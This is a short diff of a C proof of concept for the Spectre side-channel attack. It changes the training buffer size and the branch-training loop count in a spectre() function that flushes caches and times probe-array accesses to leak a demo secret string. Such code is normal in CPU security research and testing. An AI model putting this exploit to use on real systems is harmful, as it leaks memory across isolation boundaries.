@@ -7,10 +7,10 @@
 #define DELTA 1024
 #define CACHE_HIT_TIME_THRESH 10
 volatile uint64_t counter = 0;
-// unsigned int buffer_size = 16;
-// u_int8_t buffer[16] = {0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15};
-unsigned int buffer_size = 4;
-u_int8_t buffer[8] = {0,1,2,3};
+unsigned int buffer_size = 16;
+u_int8_t buffer[16] = {0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15};
+// unsigned int buffer_size = 4;
+// u_int8_t buffer[8] = {0,1,2,3};
 u_int8_t array[256*4096];
 char*secret = "This is a secret string";
 u_int8_t temp = 0;
@@ -66,7 +66,7 @@ void spectre(size_t offset){
 		flushSideChannel();
 		training_x = trial_idx % buffer_size;
 
-		for (j=0; j<30; j++) {
+		for (j=0; j<7; j++) {
 			flush(&buffer_size);
 			for (volatile int z = 0; z < 100; z++){}
 			//asm volatile("DSB SY");
